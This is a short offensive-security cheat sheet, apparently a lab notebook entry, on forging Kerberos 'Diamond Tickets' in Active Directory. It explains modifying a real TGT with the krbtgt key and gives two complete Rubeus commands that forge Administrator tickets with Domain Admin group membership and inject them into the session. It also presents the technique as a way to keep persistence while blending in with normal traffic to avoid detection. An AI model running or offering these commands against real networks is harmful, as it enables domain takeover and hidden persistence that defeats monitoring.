#AD_Diamond_Ticket


> A **Diamond Ticket** is a modified version of a legitimate **TGT (Ticket Granting Ticket)**. Unlike Golden Tickets, which are completely forged from scratch, Diamond Tickets are based on **real TGTs** that are **decrypted, modified, and re-encrypted** using the **krbtgt account key**.

A Diamond Ticket is a **modified real TGT (Ticket Granting Ticket)** where:
- A **real ticket is taken**
- Its details are **changed (like user → Administrator)**
- Then **re-encrypted using KRBTGT key**
 Simple:  
**Golden = fake from scratch**  
**Diamond = real ticket → modified**

> we need  NTLM hash of the **KRBTGT account** which means **you need to compromise DC first** (or have DA rights) to get that KRBTGT hash
> 

>Use **Diamond Tickets** when you need persistence but want to avoid detection. Golden Tickets are loud (fake timestamps), Diamond Tickets blend in with normal Kerberos traffic.

___
# Method 1: Forge a Diamond Ticket with Credentials


You can use **Rubeus** to create a Diamond Ticket using the **krbtgt AES key** and the credentials of a domain user:


```powershell
#  Rubeus.exe diamond /krbkey:<krbtgt_hash> /user:<normal_user> /password:<pass> /ticketuser:Administrator /domain:dev-angelist.lab /ptt
# - Logs in as normal user → Gets real TGT → Modifies it → Re-encrypts

Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /user:devan /password:new_password123 /enctype:rc4 /ticketuser:Administrator /domain:dev-angelist.lab /dc:corp-dc.dev-angelist.lab /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

___
## Method 2: Diamond Ticket Using /tgtdeleg

If you already have a **TGT delegation token** (captured via `Rubeus tgtdeleg`), you can generate a Diamond Ticket **without needing user credentials**:

```powershell
# Rubeus.exe diamond /krbkey:<krbtgt_hash> /tgtdeleg /ticketuser:Administrator /domain:dev-angelist.lab /ptt

Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /tgtdeleg /enctype:rc4 /ticketuser:Administrator /domain:dev-angelist.lab /dc:corp-dc.dev-angelist.lab /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
